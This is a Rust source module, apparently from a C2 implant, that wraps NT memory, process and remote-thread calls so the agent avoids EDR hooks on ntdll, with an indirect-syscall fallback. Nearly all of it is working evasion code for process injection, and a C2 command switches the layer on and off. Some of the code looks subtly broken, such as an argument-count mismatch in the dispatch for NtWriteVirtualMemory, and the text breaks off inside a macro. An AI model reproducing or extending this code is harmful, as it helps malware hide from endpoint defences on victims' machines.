//! User-mode NT kernel interface emulation.
//!
//! Implements frequently-used NT syscalls ENTIRELY in user-mode Rust code via
//! kernel32/advapi32 fallbacks, eliminating ALL references to ntdll.dll syscall
//! stubs.  This makes the agent invisible to EDR hooks on ntdll AND to ntdll
//! unhooking detection.
//!
//! # Architecture
//!
//! The emulation layer sits ABOVE `nt_syscall` — it wraps the existing indirect
//! syscall infrastructure.  When emulation is enabled and a configured function
//! is dispatched:
//!
//! 1. **kernel32/advapi32 fallback** is tried first (when `prefer_kernel32` is
//!    set in config).  The call stack shows `kernel32!WriteProcessMemory` etc.
//!    — BENEFICIAL as it looks like legitimate API usage.
//!
//! 2. **Indirect syscall fallback** is used when the kernel32 equivalent fails
//!    (when `fallback_to_indirect` is set in config).
//!
//! # Dispatch table
//!
//! A `HashMap<NtFunction, EmulationPath>` maps each emulated Nt function name
//! to either a `Kernel32(String)` path or `IndirectSyscall`.  The table is
//! populated from the `emulated_functions` config field at initialisation.
//!
//! # Global toggle
//!
//! `USE_EMULATION: AtomicBool` — toggle via C2 command `SyscallEmulationToggle`.
//! When `false`, all calls pass through to the existing indirect syscall path.
//!
//! # Emulated syscalls (9 total)
//!
//! | Nt Function              | kernel32 equivalent           |
//! |--------------------------|-------------------------------|
//! | NtWriteVirtualMemory     | WriteProcessMemory            |
//! | NtReadVirtualMemory      | ReadProcessMemory             |
//! | NtAllocateVirtualMemory  | VirtualAllocEx                |
//! | NtFreeVirtualMemory      | VirtualFreeEx                 |
//! | NtProtectVirtualMemory   | VirtualProtectEx              |
//! | NtCreateThreadEx         | CreateRemoteThread            |
//! | NtOpenProcess            | OpenProcess                   |
//! | NtClose                  | CloseHandle                   |
//! | NtQueryVirtualMemory     | VirtualQueryEx                |
//!
//! # Constraints
//!
//! - Does NOT replace `nt_syscall` — this is a LAYER on top.
//! - The indirect syscall path remains the fallback.
//! - Does NOT remove Halo's Gate SSN resolution.
//! - Does NOT change existing function signatures — wraps them.

#![cfg(all(windows, feature = "syscall-emulation"))]

use std::collections::HashSet;
use std::ffi::c_void;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::OnceLock;

use log::{debug, warn};
use winapi::um::memoryapi::*;
use winapi::um::handleapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::winnt::*;
use winapi::um::psapi::*;
use winapi::shared::minwindef::*;
use winapi::shared::ntdef::*;

// ── NTSTATUS helpers ─────────────────────────────────────────────────────────

const STATUS_SUCCESS: i32 = 0;
const STATUS_ACCESS_DENIED: i32 = 0xC0000022_u32 as i32;
const STATUS_INVALID_HANDLE: i32 = 0xC0000008_u32 as i32;
const STATUS_INVALID_PARAMETER: i32 = 0xC000000D_u32 as i32;
const STATUS_NOT_SUPPORTED: i32 = 0xC00000BB_u32 as i32;

/// Convert a Win32 `GetLastError()` code to an approximate NTSTATUS.
fn win32_to_ntstatus(error_code: DWORD) -> i32 {
    match error_code {
        0 => STATUS_SUCCESS,
        5 => STATUS_ACCESS_DENIED,          // ERROR_ACCESS_DENIED
        6 => STATUS_INVALID_HANDLE,         // ERROR_INVALID_HANDLE
        87 => STATUS_INVALID_PARAMETER,     // ERROR_INVALID_PARAMETER
        998 => STATUS_ACCESS_DENIED,        // ERROR_NOACCESS
        code => {
            debug!(
                "syscall_emulation: unmapped Win32 error {code}, returning STATUS_NOT_SUPPORTED"
            );
            STATUS_NOT_SUPPORTED
        }
    }
}

// ── Global toggle ────────────────────────────────────────────────────────────

/// Global flag controlling whether the emulation layer is active.
/// Toggle via C2 command `SyscallEmulationToggle { enabled: bool }`.
/// When `false`, all calls pass through to the existing indirect syscall path.
static USE_EMULATION: AtomicBool = AtomicBool::new(true);

/// Set the global emulation toggle.  Called from the command handler.
pub fn set_emulation_enabled(enabled: bool) {
    let prev = USE_EMULATION.swap(enabled, Ordering::SeqCst);
    if prev != enabled {
        debug!("syscall_emulation: emulation {}", if enabled { "enabled" } else { "disabled" });
    }
}

/// Query whether emulation is currently enabled.
pub fn is_emulation_enabled() -> bool {
    USE_EMULATION.load(Ordering::SeqCst)
}

// ── Dispatch table ───────────────────────────────────────────────────────────

/// Set of Nt function names that should be emulated via kernel32 fallbacks.
/// Populated from `emulated_functions` config field at initialisation.
static EMULATED_FUNCTIONS: OnceLock<HashSet<String>> = OnceLock::new();

/// Initialise the emulated functions set from the config list.
/// Called once during agent startup.
pub fn init_emulated_functions(functions: Vec<String>) {
    let set: HashSet<String> = functions.into_iter().collect();
    let _ = EMULATED_FUNCTIONS.set(set);
    debug!(
        "syscall_emulation: initialised with {} emulated functions",
        EMULATED_FUNCTIONS.get().map(|s| s.len()).unwrap_or(0)
    );
}

/// Check whether a given Nt function should be emulated.
///
/// Public so the `emulated_syscall!` macro can call it.
pub fn should_emulate(func_name: &str) -> bool {
    EMULATED_FUNCTIONS
        .get()
        .map(|s| s.contains(func_name))
        .unwrap_or(false)
}

// ── Configuration ────────────────────────────────────────────────────────────

/// Configuration state for the emulation layer, cached at init time.
#[derive(Debug, Clone)]
struct EmulationConfig {
    prefer_kernel32: bool,
    fallback_to_indirect: bool,
}

static EMULATION_CONFIG: OnceLock<EmulationConfig> = OnceLock::new();

/// Initialise the emulation configuration.  Called once during agent startup.
pub fn init_config(prefer_kernel32: bool, fallback_to_indirect: bool) {
    let _ = EMULATION_CONFIG.set(EmulationConfig {
        prefer_kernel32,
        fallback_to_indirect,
    });
}

fn get_config() -> &'static EmulationConfig {
    EMULATION_CONFIG.get().unwrap_or(&EmulationConfig {
        prefer_kernel32: true,
        fallback_to_indirect: true,
    })
}

// ── Emulated syscall wrappers ────────────────────────────────────────────────
//
// Each wrapper function follows the same pattern:
//   1. Check if emulation is globally enabled AND the function is in the
//      emulated set AND prefer_kernel32 is configured.
//   2. If so, call the kernel32/advapi32 equivalent.
//   3. If that succeeds, return STATUS_SUCCESS.
//   4. If that fails AND fallback_to_indirect is set, call the existing
//      indirect syscall path.
//   5. If emulation is not active for this function, call the existing
//      indirect syscall path directly.

/// Emulate `NtWriteVirtualMemory` via `WriteProcessMemory`.
///
/// Writes data to the virtual address space of a target process.
///
/// # Arguments (as u64, matching the syscall ABI)
/// - `process_handle`  — HANDLE to the target process
/// - `base_address`    — address in the target to write to
/// - `buffer`          — pointer to the data to write
/// - `number_of_bytes_to_write` — number of bytes to write
/// - `number_of_bytes_written`  — OUT: optional pointer for bytes written
///
/// # Returns
/// NTSTATUS code.
pub fn emulate_nt_write_virtual_memory(
    process_handle: u64,
    base_address: u64,
    buffer: u64,
    number_of_bytes_to_write: u64,
    number_of_bytes_written: u64,
) -> anyhow::Result<i32> {
    let config = get_config();

    if is_emulation_enabled() && should_emulate("NtWriteVirtualMemory") && config.prefer_kernel32 {
        debug!("syscall_emulation: NtWriteVirtualMemory → WriteProcessMemory");
        let mut bytes_written: SIZE_T = 0;
        let result = unsafe {
            WriteProcessMemory(
                process_handle as HANDLE,
                base_address as *mut c_void,
                buffer as *const c_void,
                number_of_bytes_to_write as SIZE_T,
                &mut bytes_written as *mut SIZE_T,
            )
        };

        if result != 0 {
            // Success — write back bytes_written if caller wants it.
            if number_of_bytes_written != 0 {
                let out_ptr = number_of_bytes_written as *mut SIZE_T;
                unsafe {
                    *out_ptr = bytes_written;
                }
            }
            return Ok(STATUS_SUCCESS);
        }

        let err = unsafe { GetLastError() };
        debug!(
            "syscall_emulation: WriteProcessMemory failed with Win32 error {err}"
        );

        if !config.fallback_to_indirect {
            return Ok(win32_to_ntstatus(err));
        }
        debug!("syscall_emulation: falling back to indirect syscall");
    }

    // Fallback: indirect syscall.
    let target = nt_syscall::get_syscall_id("NtWriteVirtualMemory")?;
    let args: &[u64] = &[
        process_handle,
        base_address,
        buffer,
        number_of_bytes_to_write,
        number_of_bytes_written,
    ];
    Ok(unsafe { nt_syscall::do_syscall(target.ssn, target.gadget_addr, args) })
}

/// Emulate `NtReadVirtualMemory` via `ReadProcessMemory`.
///
/// Reads data from the virtual address space of a target process.
///
/// # Arguments (as u64, matching the syscall ABI)
/// - `process_handle`  — HANDLE to the target process
/// - `base_address`    — address in the target to read from
/// - `buffer`          — pointer to the output buffer
/// - `number_of_bytes_to_read` — number of bytes to read
/// - `number_of_bytes_read`    — OUT: optional pointer for bytes read
///
/// # Returns
/// NTSTATUS code.
pub fn emulate_nt_read_virtual_memory(
    process_handle: u64,
    base_address: u64,
    buffer: u64,
    number_of_bytes_to_read: u64,
    number_of_bytes_read: u64,
) -> anyhow::Result<i32> {
    let config = get_config();

    if is_emulation_enabled() && should_emulate("NtReadVirtualMemory") && config.prefer_kernel32 {
        debug!("syscall_emulation: NtReadVirtualMemory → ReadProcessMemory");
        let mut bytes_read: SIZE_T = 0;
        let result = unsafe {
            ReadProcessMemory(
                process_handle as HANDLE,
                base_address as *const c_void,
                buffer as *mut c_void,
                number_of_bytes_to_read as SIZE_T,
                &mut bytes_read as *mut SIZE_T,
            )
        };

        if result != 0 {
            if number_of_bytes_read != 0 {
                let out_ptr = number_of_bytes_read as *mut SIZE_T;
                unsafe {
                    *out_ptr = bytes_read;
                }
            }
            return Ok(STATUS_SUCCESS);
        }

        let err = unsafe { GetLastError() };
        debug!(
            "syscall_emulation: ReadProcessMemory failed with Win32 error {err}"
        );

        if !config.fallback_to_indirect {
            return Ok(win32_to_ntstatus(err));
        }
        debug!("syscall_emulation: falling back to indirect syscall");
    }

    let target = nt_syscall::get_syscall_id("NtReadVirtualMemory")?;
    let args: &[u64] = &[
        process_handle,
        base_address,
        buffer,
        number_of_bytes_to_read,
        number_of_bytes_read,
    ];
    Ok(unsafe { nt_syscall::do_syscall(target.ssn, target.gadget_addr, args) })
}

/// Emulate `NtAllocateVirtualMemory` via `VirtualAllocEx`.
///
/// Reserves and/or commits a region of pages in the virtual address space
/// of a target process.
///
/// # Arguments (as u64, matching the syscall ABI)
/// - `process_handle`       — HANDLE to the target process
/// - `base_address`         — IN/OUT: pointer to the base address (0 = auto)
/// - `zero_bits`            — number of high-order address bits that must be zero
/// - `region_size`          — IN/OUT: pointer to the size of the region
/// - `allocation_type`      — MEM_COMMIT, MEM_RESERVE, etc.
/// - `protect`              — memory protection (PAGE_READWRITE, etc.)
///
/// # Returns
/// NTSTATUS code.
pub fn emulate_nt_allocate_virtual_memory(
    process_handle: u64,
    base_address: u64,
    zero_bits: u64,
    region_size: u64,
    allocation_type: u64,
    protect: u64,
) -> anyhow::Result<i32> {
    let config = get_config();

    if is_emulation_enabled() && should_emulate("NtAllocateVirtualMemory") && config.prefer_kernel32 {
        debug!("syscall_emulation: NtAllocateVirtualMemory → VirtualAllocEx");

        // Read the desired size from the caller's region_size pointer.
        let size = if region_size != 0 {
            unsafe { *(region_size as *const SIZE_T) }
        } else {
            0
        };

        let allocated = unsafe {
            VirtualAllocEx(
                process_handle as HANDLE,
                if base_address != 0 {
                    *(base_address as *const *mut c_void)
                } else {
                    std::ptr::null_mut()
                },
                size,
                allocation_type as DWORD,
                protect as DWORD,
            )
        };

        if !allocated.is_null() {
            // Write back the base address and size to the caller's pointers.
            if base_address != 0 {
                let base_ptr = base_address as *mut *mut c_void;
                unsafe {
                    *base_ptr = allocated;
                }
            }
            if region_size != 0 {
                let size_ptr = region_size as *mut SIZE_T;
                unsafe {
                    *size_ptr = size;
                }
            }
            return Ok(STATUS_SUCCESS);
        }

        let err = unsafe { GetLastError() };
        debug!(
            "syscall_emulation: VirtualAllocEx failed with Win32 error {err}"
        );

        if !config.fallback_to_indirect {
            return Ok(win32_to_ntstatus(err));
        }
        debug!("syscall_emulation: falling back to indirect syscall");
    }

    let target = nt_syscall::get_syscall_id("NtAllocateVirtualMemory")?;
    let args: &[u64] = &[
        process_handle,
        base_address,
        zero_bits,
        region_size,
        allocation_type,
        protect,
    ];
    Ok(unsafe { nt_syscall::do_syscall(target.ssn, target.gadget_addr, args) })
}

/// Emulate `NtFreeVirtualMemory` via `VirtualFreeEx`.
///
/// Releases, decommits, or both a region of pages within the virtual address
/// space of a target process.
///
/// # Arguments (as u64, matching the syscall ABI)
/// - `process_handle`  — HANDLE to the target process
/// - `base_address`    — IN/OUT: pointer to the base address
/// - `region_size`     — IN/OUT: pointer to the size
/// - `free_type`       — MEM_DECOMMIT or MEM_RELEASE
///
/// # Returns
/// NTSTATUS code.
pub fn emulate_nt_free_virtual_memory(
    process_handle: u64,
    base_address: u64,
    region_size: u64,
    free_type: u64,
) -> anyhow::Result<i32> {
    let config = get_config();

    if is_emulation_enabled() && should_emulate("NtFreeVirtualMemory") && config.prefer_kernel32 {
        debug!("syscall_emulation: NtFreeVirtualMemory → VirtualFreeEx");

        let addr = if base_address != 0 {
            unsafe { *(base_address as *const *mut c_void) }
        } else {
            std::ptr::null_mut()
        };
        let size = if region_size != 0 {
            unsafe { *(region_size as *const SIZE_T) }
        } else {
            0
        };

        let result = unsafe {
            VirtualFreeEx(
                process_handle as HANDLE,
                addr,
                size,
                free_type as DWORD,
            )
        };

        if result != 0 {
            return Ok(STATUS_SUCCESS);
        }

        let err = unsafe { GetLastError() };
        debug!(
            "syscall_emulation: VirtualFreeEx failed with Win32 error {err}"
        );

        if !config.fallback_to_indirect {
            return Ok(win32_to_ntstatus(err));
        }
        debug!("syscall_emulation: falling back to indirect syscall");
    }

    let target = nt_syscall::get_syscall_id("NtFreeVirtualMemory")?;
    let args: &[u64] = &[
        process_handle,
        base_address,
        region_size,
        free_type,
    ];
    Ok(unsafe { nt_syscall::do_syscall(target.ssn, target.gadget_addr, args) })
}

/// Emulate `NtProtectVirtualMemory` via `VirtualProtectEx`.
///
/// Changes the protection on a region of committed pages in the virtual
/// address space of a target process.
///
/// # Arguments (as u64, matching the syscall ABI)
/// - `process_handle`   — HANDLE to the target process
/// - `base_address`     — IN/OUT: pointer to the base address
/// - `region_size`      — IN/OUT: pointer to the size
/// - `new_protect`      — new memory protection constant
/// - `old_protect`      — OUT: pointer to receive the old protection
///
/// # Returns
/// NTSTATUS code.
pub fn emulate_nt_protect_virtual_memory(
    process_handle: u64,
    base_address: u64,
    region_size: u64,
    new_protect: u64,
    old_protect: u64,
) -> anyhow::Result<i32> {
    let config = get_config();

    if is_emulation_enabled() && should_emulate("NtProtectVirtualMemory") && config.prefer_kernel32 {
        debug!("syscall_emulation: NtProtectVirtualMemory → VirtualProtectEx");

        let addr = if base_address != 0 {
            unsafe { *(base_address as *const *mut c_void) }
        } else {
            std::ptr::null_mut()
        };
        let size = if region_size != 0 {
            unsafe { *(region_size as *const SIZE_T) }
        } else {
            0
        };
        let mut old: DWORD = 0;

        let result = unsafe {
            VirtualProtectEx(
                process_handle as HANDLE,
                addr,
                size,
                new_protect as DWORD,
                &mut old,
            )
        };

        if result != 0 {
            // Write back old protection if caller wants it.
            if old_protect != 0 {
                let out_ptr = old_protect as *mut DWORD;
                unsafe {
                    *out_ptr = old;
                }
            }
            // Write back the potentially rounded base/size.
            if base_address != 0 {
                let base_ptr = base_address as *mut *mut c_void;
                unsafe {
                    *base_ptr = addr;
                }
            }
            return Ok(STATUS_SUCCESS);
        }

        let err = unsafe { GetLastError() };
        debug!(
            "syscall_emulation: VirtualProtectEx failed with Win32 error {err}"
        );

        if !config.fallback_to_indirect {
            return Ok(win32_to_ntstatus(err));
        }
        debug!("syscall_emulation: falling back to indirect syscall");
    }

    let target = nt_syscall::get_syscall_id("NtProtectVirtualMemory")?;
    let args: &[u64] = &[
        process_handle,
        base_address,
        region_size,
        new_protect,
        old_protect,
    ];
    Ok(unsafe { nt_syscall::do_syscall(target.ssn, target.gadget_addr, args) })
}

/// Emulate `NtCreateThreadEx` via `CreateRemoteThread`.
///
/// Creates a thread that runs in the virtual address space of another process.
///
/// **Limitation**: `CreateRemoteThread` is less flexible than `NtCreateThreadEx`
/// (no CREATE_SUSPENDED, no PS_ATTRIBUTE list).  For advanced use cases
/// (e.g. suspended thread creation), this always falls back to indirect syscall.
///
/// # Arguments (as u64, matching the syscall ABI)
/// - `thread_handle`     — OUT: pointer to receive the new thread handle
/// - `desired_access`    — access mask for the thread object
/// - `object_attributes` — optional OBJECT_ATTRIBUTES pointer
/// - `process_handle`    — HANDLE to the target process
/// - `start_routine`     — address of the thread start routine
/// - `argument`          — argument passed to the thread routine
/// - `create_flags`      — creation flags (CREATE_SUSPENDED, etc.)
/// - `zero_bits`         — zero bits for stack allocation
/// - `stack_size`        — initial stack size (0 = default)
/// - `maximum_stack_size` — maximum stack size (0 = default)
/// - `attribute_list`    — optional PS_ATTRIBUTE_LIST
///
/// # Returns
/// NTSTATUS code.
pub fn emulate_nt_create_thread_ex(
    thread_handle: u64,
    desired_access: u64,
    object_attributes: u64,
    process_handle: u64,
    start_routine: u64,
    argument: u64,
    create_flags: u64,
    zero_bits: u64,
    stack_size: u64,
    maximum_stack_size: u64,
    attribute_list: u64,
) -> anyhow::Result<i32> {
    let config = get_config();

    // CreateRemoteThread cannot create suspended threads.  If the caller
    // wants CREATE_SUSPENDED (0x00000004), fall back to indirect syscall.
    let create_suspended = 0x00000004u64;
    if (create_flags & create_suspended) != 0 {
        debug!(
            "syscall_emulation: NtCreateThreadEx — CREATE_SUSPENDED requested, using indirect syscall"
        );
        let target = nt_syscall::get_syscall_id("NtCreateThreadEx")?;
        let args: &[u64] = &[
            thread_handle,
            desired_access,
            object_attributes,
            process_handle,
            start_routine,
            argument,
            create_flags,
            zero_bits,
            stack_size,
            maximum_stack_size,
            attribute_list,
        ];
        return Ok(unsafe { nt_syscall::do_syscall(target.ssn, target.gadget_addr, args) });
    }

    if is_emulation_enabled() && should_emulate("NtCreateThreadEx") && config.prefer_kernel32 {
        debug!("syscall_emulation: NtCreateThreadEx → CreateRemoteThread");

        let mut tid: DWORD = 0;
        let handle = unsafe {
            CreateRemoteThread(
                process_handle as HANDLE,
                std::ptr::null_mut(),
                stack_size as SIZE_T,
                Some(std::mem::transmute(start_routine)),
                argument as *mut c_void,
                0, // CreateRemoteThread doesn't support flags
                &mut tid,
            )
        };

        if !handle.is_null() {
            if thread_handle != 0 {
                let out_ptr = thread_handle as *mut HANDLE;
                unsafe {
                    *out_ptr = handle;
                }
            }
            return Ok(STATUS_SUCCESS);
        }

        let err = unsafe { GetLastError() };
        debug!(
            "syscall_emulation: CreateRemoteThread failed with Win32 error {err}"
        );

        if !config.fallback_to_indirect {
            return Ok(win32_to_ntstatus(err));
        }
        debug!("syscall_emulation: falling back to indirect syscall");
    }

    let target = nt_syscall::get_syscall_id("NtCreateThreadEx")?;
    let args: &[u64] = &[
        thread_handle,
        desired_access,
        object_attributes,
        process_handle,
        start_routine,
        argument,
        create_flags,
        zero_bits,
        stack_size,
        maximum_stack_size,
        attribute_list,
    ];
    Ok(unsafe { nt_syscall::do_syscall(target.ssn, target.gadget_addr, args) })
}

/// Emulate `NtOpenProcess` via `OpenProcess`.
///
/// Opens an existing local process object.
///
/// # Arguments (as u64, matching the syscall ABI)
/// - `process_handle`    — OUT: pointer to receive the process handle
/// - `desired_access`    — access mask (PROCESS_ALL_ACCESS, etc.)
/// - `object_attributes` — optional OBJECT_ATTRIBUTES (we use PID from client_id)
/// - `client_id`         — pointer to CLIENT_ID containing the target PID
///
/// # Returns
/// NTSTATUS code.
pub fn emulate_nt_open_process(
    process_handle: u64,
    desired_access: u64,
    object_attributes: u64,
    client_id: u64,
) -> anyhow::Result<i32> {
    let config = get_config();

    if is_emulation_enabled() && should_emulate("NtOpenProcess") && config.prefer_kernel32 {
        debug!("syscall_emulation: NtOpenProcess → OpenProcess");

        // CLIENT_ID layout: { UniqueProcess: HANDLE, UniqueThread: HANDLE }
        // UniqueProcess is the PID we need.
        let pid = if client_id != 0 {
            unsafe { *(client_id as *const DWORD) }
        } else {
            warn!("syscall_emulation: NtOpenProcess called with null client_id");
            return Ok(STATUS_INVALID_PARAMETER);
        };

        let handle = unsafe {
            OpenProcess(
                desired_access as DWORD,
                0, // bInheritHandle = FALSE
                pid,
            )
        };

        if !handle.is_null() {
            if process_handle != 0 {
                let out_ptr = process_handle as *mut HANDLE;
                unsafe {
                    *out_ptr = handle;
                }
            }
            return Ok(STATUS_SUCCESS);
        }

        let err = unsafe { GetLastError() };
        debug!(
            "syscall_emulation: OpenProcess failed with Win32 error {err}"
        );

        if !config.fallback_to_indirect {
            return Ok(win32_to_ntstatus(err));
        }
        debug!("syscall_emulation: falling back to indirect syscall");
    }

    let target = nt_syscall::get_syscall_id("NtOpenProcess")?;
    let args: &[u64] = &[
        process_handle,
        desired_access,
        object_attributes,
        client_id,
    ];
    Ok(unsafe { nt_syscall::do_syscall(target.ssn, target.gadget_addr, args) })
}

/// Emulate `NtClose` via `CloseHandle`.
///
/// Closes an open object handle.
///
/// # Arguments (as u64, matching the syscall ABI)
/// - `handle` — the handle to close
///
/// # Returns
/// NTSTATUS code.
pub fn emulate_nt_close(handle: u64) -> anyhow::Result<i32> {
    let config = get_config();

    if is_emulation_enabled() && should_emulate("NtClose") && config.prefer_kernel32 {
        debug!("syscall_emulation: NtClose → CloseHandle");

        let result = unsafe { CloseHandle(handle as HANDLE) };

        if result != 0 {
            return Ok(STATUS_SUCCESS);
        }

        let err = unsafe { GetLastError() };
        debug!(
            "syscall_emulation: CloseHandle failed with Win32 error {err}"
        );

        if !config.fallback_to_indirect {
            return Ok(win32_to_ntstatus(err));
        }
        debug!("syscall_emulation: falling back to indirect syscall");
    }

    let target = nt_syscall::get_syscall_id("NtClose")?;
    let args: &[u64] = &[handle];
    Ok(unsafe { nt_syscall::do_syscall(target.ssn, target.gadget_addr, args) })
}

/// Emulate `NtQueryVirtualMemory` via `VirtualQueryEx`.
///
/// Retrieves information about a range of pages within the virtual address
/// space of a specified process.
///
/// # Arguments (as u64, matching the syscall ABI)
/// - `process_handle`      — HANDLE to the target process
/// - `base_address`        — base address to query
/// - `memory_information_class` — type of information to retrieve
///     (0 = MemoryBasicInformation)
/// - `memory_information`  — OUT: buffer for the results
/// - `memory_information_length` — size of the output buffer
/// - `return_length`       — OUT: optional pointer for bytes returned
///
/// # Returns
/// NTSTATUS code.
pub fn emulate_nt_query_virtual_memory(
    process_handle: u64,
    base_address: u64,
    memory_information_class: u64,
    memory_information: u64,
    memory_information_length: u64,
    return_length: u64,
) -> anyhow::Result<i32> {
    let config = get_config();

    // Only MemoryBasicInformation (class 0) is supported via VirtualQueryEx.
    // Higher classes (MemorySectionName, etc.) require indirect syscall.
    if memory_information_class != 0 {
        debug!(
            "syscall_emulation: NtQueryVirtualMemory — class {memory_information_class} not supported via VirtualQueryEx, using indirect syscall"
        );
        let target = nt_syscall::get_syscall_id("NtQueryVirtualMemory")?;
        let args: &[u64] = &[
            process_handle,
            base_address,
            memory_information_class,
            memory_information,
            memory_information_length,
            return_length,
        ];
        return Ok(unsafe { nt_syscall::do_syscall(target.ssn, target.gadget_addr, args) });
    }

    if is_emulation_enabled() && should_emulate("NtQueryVirtualMemory") && config.prefer_kernel32 {
        debug!("syscall_emulation: NtQueryVirtualMemory → VirtualQueryEx");

        let mut mbi: MEMORY_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
        let result = unsafe {
            VirtualQueryEx(
                process_handle as HANDLE,
                base_address as *const c_void,
                &mut mbi,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            )
        };

        if result != 0 {
            // Copy the result to the caller's buffer if it's large enough.
            if memory_information != 0
                && memory_information_length as usize >= std::mem::size_of::<MEMORY_BASIC_INFORMATION>()
            {
                let out_ptr = memory_information as *mut MEMORY_BASIC_INFORMATION;
                unsafe {
                    *out_ptr = mbi;
                }
            }
            if return_length != 0 {
                let ret_ptr = return_length as *mut ULONG;
                unsafe {
                    *ret_ptr = std::mem::size_of::<MEMORY_BASIC_INFORMATION>() as ULONG;
                }
            }
            return Ok(STATUS_SUCCESS);
        }

        let err = unsafe { GetLastError() };
        debug!(
            "syscall_emulation: VirtualQueryEx failed with Win32 error {err}"
        );

        if !config.fallback_to_indirect {
            return Ok(win32_to_ntstatus(err));
        }
        debug!("syscall_emulation: falling back to indirect syscall");
    }

    let target = nt_syscall::get_syscall_id("NtQueryVirtualMemory")?;
    let args: &[u64] = &[
        process_handle,
        base_address,
        memory_information_class,
        memory_information,
        memory_information_length,
        return_length,
    ];
    Ok(unsafe { nt_syscall::do_syscall(target.ssn, target.gadget_addr, args) })
}

// ── Convenience re-exports for indirect-syscall fallback ─────────────────────
//
// When emulation is disabled or not compiled in, consumers can call these
// directly as a pass-through to the underlying nt_syscall infrastructure.

/// Direct access to `nt_syscall::syscall!` macro for callers that need the
/// raw indirect syscall path.  This is the SAME macro as `nt_syscall::syscall!`
/// but re-exported here for ergonomic use from modules that import the
/// emulation layer.
pub use nt_syscall::get_syscall_id;
pub use nt_syscall::do_syscall;

// ── Integration helpers ──────────────────────────────────────────────────────

/// Initialise the syscall emulation layer from the agent config.
///
/// Called once during agent startup.  Sets the emulated functions list,
/// configuration preferences, and the initial enabled/disabled state.
pub fn init_from_config(config: &common::config::SyscallEmulationConfig) {
    init_emulated_functions(config.emulated_functions.clone());
    init_config(config.prefer_kernel32, config.fallback_to_indirect);
    set_emulation_enabled(config.enabled);
    debug!(
        "syscall_emulation: initialised — enabled={}, prefer_kernel32={}, fallback_to_indirect={}, functions={:?}",
        config.enabled,
        config.prefer_kernel32,
        config.fallback_to_indirect,
        config.emulated_functions,
    );
}

/// Return a JSON status summary of the emulation layer.
///
/// Used by the `SyscallEmulationToggle` command handler to report state.
pub fn status_json() -> String {
    let enabled = is_emulation_enabled();
    let config = get_config();
    let functions = EMULATED_FUNCTIONS
        .get()
        .map(|s| s.iter().cloned().collect::<Vec<_>>())
        .unwrap_or_default();

    serde_json::json!({
        "enabled": enabled,
        "prefer_kernel32": config.prefer_kernel32,
        "fallback_to_indirect": config.fallback_to_indirect,
        "emulated_functions": functions,
    })
    .to_string()
}

// ── Dispatch + macro for ergonomic integration ───────────────────────────────
//
// The `emulated_syscall!` macro mirrors `nt_syscall::syscall!` so that
// consuming modules can swap the import without changing call sites.
//
// When emulation is compiled in and enabled, the macro first tries the
// kernel32/advapi32 path.  If that fails (or the function is not in the
// emulated set), it falls back to the existing indirect-syscall path.
//
// When the `syscall-emulation` feature is NOT compiled in, the macro
// expands to a plain `nt_syscall::syscall!` call (zero overhead).

/// Internal: dispatch an emulated syscall by name.
///
/// Public so the `emulated_syscall!` macro can call it.
/// Maps the function name to the corresponding emulation wrapper.
/// Returns `Ok(NTSTATUS)` on success.  On failure returns the error
/// so the caller can fall back to the indirect-syscall path.
pub fn dispatch(name: &str, args: &[u64]) -> anyhow::Result<i32> {
    match name {
        "NtClose" => {
            if args.len() < 1 {
                return Err(anyhow::anyhow!("NtClose requires 1 argument"));
            }
            emulate_nt_close(args[0])
        }
        "NtOpenProcess" => {
            if args.len() < 4 {
                return Err(anyhow::anyhow!("NtOpenProcess requires 4 arguments"));
            }
            emulate_nt_open_process(args[0], args[1], args[2], args[3])
        }
        "NtWriteVirtualMemory" => {
            if args.len() < 6 {
                return Err(anyhow::anyhow!("NtWriteVirtualMemory requires 6 arguments"));
            }
            emulate_nt_write_virtual_memory(
                args[0], args[1], args[2], args[3], args[4], args[5],
            )
        }
        "NtReadVirtualMemory" => {
            if args.len() < 5 {
                return Err(anyhow::anyhow!("NtReadVirtualMemory requires 5 arguments"));
            }
            emulate_nt_read_virtual_memory(
                args[0], args[1], args[2], args[3], args[4],
            )
        }
        "NtAllocateVirtualMemory" => {
            if args.len() < 6 {
                return Err(anyhow::anyhow!("NtAllocateVirtualMemory requires 6 arguments"));
            }
            emulate_nt_allocate_virtual_memory(
                args[0], args[1], args[2], args[3], args[4], args[5],
            )
        }
        "NtFreeVirtualMemory" => {
            if args.len() < 4 {
                return Err(anyhow::anyhow!("NtFreeVirtualMemory requires 4 arguments"));
            }
            emulate_nt_free_virtual_memory(args[0], args[1], args[2], args[3])
        }
        "NtProtectVirtualMemory" => {
            if args.len() < 5 {
                return Err(anyhow::anyhow!("NtProtectVirtualMemory requires 5 arguments"));
            }
            emulate_nt_protect_virtual_memory(
                args[0], args[1], args[2], args[3], args[4],
            )
        }
        "NtCreateThreadEx" => {
            if args.len() < 11 {
                return Err(anyhow::anyhow!("NtCreateThreadEx requires 11 arguments"));
            }
            emulate_nt_create_thread_ex(
                args[0], args[1], args[2], args[3], args[4], args[5],
                args[6], args[7], args[8], args[9], args[10],
            )
        }
        "NtQueryVirtualMemory" => {
            if args.len() < 6 {
                return Err(anyhow::anyhow!("NtQueryVirtualMemory requires 6 arguments"));
            }
            emulate_nt_query_virtual_memory(
                args[0], args[1], args[2], args[3], args[4], args[5],
            )
        }
        other => Err(anyhow::anyhow!("unknown emulated syscall: {}", other)),
    }
}

/// Emulation-aware syscall macro.
///
/// Drop-in replacement for `nt_syscall::syscall!`.  When the syscall
/// emulation layer is compiled in AND enabled, it first tries the
/// kernel32/advapi32 path for any function listed in `emulated_functions`.
/// On failure (or if the function is not emulated), it falls back to the
/// existing indirect-syscall path via `nt_syscall::syscall!`.
///
/// # Example
///
/// ```ignore
/// // Instead of:
/// let status = nt_syscall::syscall!("NtClose", handle as u64);
///
/// // Use:
/// let status = emulated_syscall!("NtClose", handle as u64);
/// ```
///
/// The return type is `anyhow::Result<i32>` (NTSTATUS), identical to
/// `nt_syscall::syscall!`.
#[macro_export]
macro_rules! emulated_syscall {
    ($func_name:expr $(, $args:expr)* $(,)?) => {{
        let __name: &str = $func_name;
        let __args: &[u64] = &[$($args as u64),*];

        if $crate::syscall_emulation::is_emulation_enabled()
            && $crate::syscall_emulation::should_emulate(__name)
        {
            match $crate::syscall_emulation::dispatch(__name, __args) {
                Ok(status) if status >= 0 => {
                    log::trace!("emulated_syscall: {} → emulation success (status={:#x})", __name, status);
                    Ok(status)
                }
                Ok(status) => {
